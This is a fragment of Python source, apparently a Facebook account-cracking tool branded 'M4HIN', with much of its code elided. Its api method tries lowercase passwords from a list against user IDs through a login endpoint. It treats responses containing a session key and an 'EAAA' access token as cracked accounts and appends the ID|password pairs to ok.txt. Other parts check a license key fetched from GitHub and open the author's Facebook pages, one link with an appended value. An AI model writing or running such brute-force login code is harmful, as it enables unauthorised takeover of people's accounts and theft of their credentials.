...
def notice():
	...
	runtxt("\033[0;92m BYPASS ADMIN FACEBOOK >> https://www.facebook.com/Ev4n69")
	runtxt("\033[0;95m    <============☠️  \033[0;97mEXIT\033[0;95m ☠️============> ")
	os.system('am start https://www.facebook.com/profile.php?id=100086252664602?text=' + tks)
	subprocess.check_output(["am", "start", "https://www.facebook.com/Ev4n69"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://github.com/XDMAHIN-KHAN/MULTI_MK/blob/main/Approve_mK.txt').text
			if basesplit in plr:
				key = basesplit
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[M4HIN] : %s/%s -> \033[0;92m [ M4HIN-OK:%s ]- \033[0;91m[M4HIN-Cp:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;92m   [M4HIN-OK] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;91m   [M4HIN-Cp] %s | %s\033[0;97m         "%(uid, pw))
